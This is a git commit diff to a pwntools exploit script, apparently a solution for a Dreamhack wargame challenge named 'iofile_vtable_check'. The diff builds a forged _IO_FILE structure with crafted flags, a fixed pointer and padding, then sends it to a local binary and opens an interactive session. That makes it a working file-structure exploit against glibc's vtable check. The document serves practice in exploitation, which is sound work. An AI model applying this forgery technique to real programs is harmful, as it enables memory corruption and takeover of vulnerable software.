42151fa92d2c0d9e1ff4cd8087e5eeda7489a75a
Your Name <you@example.com>
2020-12-13 19:14:12 -0800

    t

--- dreamhack/iofile_vtable_check/ex.py
+++ dreamhack/iofile_vtable_check/ex.py
@@ -2,5 +2,12 @@ from pwn import *
 p = process('iofile_vtable_check')
 raw_input('debug: ' + str(p.pid))
 p.recvrepeat(1)
-p.sendline('a'*0xd8 + 'A'*8 + p64(0))
+
+_IO_FILE = p64(0xfbad2488) #flags
+_IO_FILE += p64(0)*((0x88 - 8)/8)
+_IO_FILE += p64(0x602340) + p64(0)*(0xd8 - len(_IO_FILE))
+_IO_FILE_plus = _IO_FILE + 'A'*8
+payload = _IO_FILE_plus + p64(0)
+
+p.sendline(payload)
 p.interactive()
